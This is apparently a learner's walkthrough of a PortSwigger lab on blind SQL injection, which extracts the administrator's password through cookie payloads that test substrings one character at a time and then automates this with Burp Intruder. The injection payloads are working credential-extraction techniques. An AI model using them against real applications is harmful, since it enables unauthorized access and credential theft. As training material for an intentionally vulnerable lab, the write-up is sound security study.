[Source](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
## Task
This lab contains a Blind SQL injection vulnerability. The application uses tracking cookies for analytics and executes a SQL query that uses the value of the passed cookie.

The results of the SQL query are not returned, and no errors are displayed. However, the application includes a "Welcome back" message on the page if the query returns at least one row.

The database contains a `users` table with `username` and `password` columns. You need to exploit the Blind SQL injection vulnerability to find out the password of the admin user.

Log in as the admin user to solve the task.
## Solution
Go to the site
![[Pasted image 20241202200651.png]]
Intercept the main page request in `Burp Suite` and send it to `Repeater`
![[Pasted image 20241202201417.png]]
Check if there is a `users` table
```SQL
' AND (SELECT 'a' FROM users LIMIT 1)='a
```
![[Pasted image 20241202202115.png]]
Check if there is an `administrator` user
```SQL
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
![[Pasted image 20241202202217.png]]
Find out how many characters are in password for `administrator`. Gradually increase from 1 until `Welcome back!` is displayed. I stopped at 20 characters. So the password length is 20 characters
```SQL
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
![[Pasted image 20241202202617.png]]
Let's check the first letter of the administrator password. Is it less than `m` or not.
```SQL
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=+'administrator'),1,1)<'m
```
![[Pasted image 20241202201531.png]]
The first letter is less than `m`. Let's check if the first letter is greater than `i`
```SQL
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=+'administrator'),1,1)>'i
```
![[Pasted image 20241202201636.png]]
This is how we found the first letter `j`
```SQL
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='j
```
![[Pasted image 20241202201721.png]]
Since it will take a long time to sort through 20 characters, we will use `Intruder`. Send this query to it
![[Pasted image 20241202202926.png]]
Change the query
```SQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
![[Pasted image 20241202203004.png]]
Add payload markers to the final character (`a`), so it looks like this
```SQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```
Go to the `Payloads` tab and set `Payload type` to `Simple list` and in `Payload settings [Simple list]` enter all the letters of the English alphabet and numbers
![[Pasted image 20241202204030.png]]
In the `Intruder` settings, search for `Grep - Match` and add the line `Welcome back` to it
![[Pasted image 20241202204203.png]]
Launch the attack.
![[Pasted image 20241202210443.png]]We see that the first value of the password is `9`. To search for the following values, change the query
```SQL
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
```
The final password is `9sy0zpypsrw7x8pqzw02`. Log in as administrator
![[Pasted image 20241202210959.png]]
![[Pasted image 20241202211006.png]]